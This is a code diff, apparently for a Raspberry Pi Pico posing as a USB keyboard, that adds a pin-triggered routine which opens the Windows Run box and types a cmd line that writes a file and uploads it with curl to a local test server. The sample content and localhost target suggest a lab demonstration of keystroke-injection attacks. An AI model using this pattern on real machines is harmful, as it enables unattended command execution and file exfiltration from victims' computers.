@@ -27,6 +27,7 @@ gp0 = init_input(board.GP0)
 gp1 = init_input(board.GP1)
 gp2 = init_input(board.GP2)
 gp3 = init_input(board.GP3)
+gp4 = init_input(board.GP4)
 
 # Fait clignoter la LED tant que le script est en phase d'initialisation.
 async def blink_task(stop_event, period=0.15):
@@ -90,6 +91,28 @@ def pdf_download_and_open(kbd, layout):
     time.sleep(1.0)
 
 
+def import_data_on_website(kbd, layout):
+    WEB_UPLOAD_URL = "http://127.0.0.1:5000/upload"
+    TXT_FILENAME = "m.txt"
+    TXT_CONTENT = "Test Pico HID"
+    command = (
+        "cmd /c cd /d %TEMP%&&echo "
+        + TXT_CONTENT
+        + ">"
+        + TXT_FILENAME
+        + '&&curl -F "file=@'
+        + TXT_FILENAME
+        + '" '
+        + WEB_UPLOAD_URL
+    )
+
+    kbd.send(Keycode.GUI, Keycode.R)
+    time.sleep(0.3)
+    layout.write(command)
+    kbd.send(Keycode.ENTER)
+    time.sleep(1.0)
+
+
 # Attend l'initialisation USB, puis execute les actions associees aux GPIO actifs.
 async def main():
    
@@ -115,6 +138,9 @@ async def main():
 
     if gp3.value:
         pdf_download_and_open(kbd, layout)
+
+    if gp4.value:
+        import_data_on_website(kbd, layout)
     
     await asyncio.sleep(0.6)
 
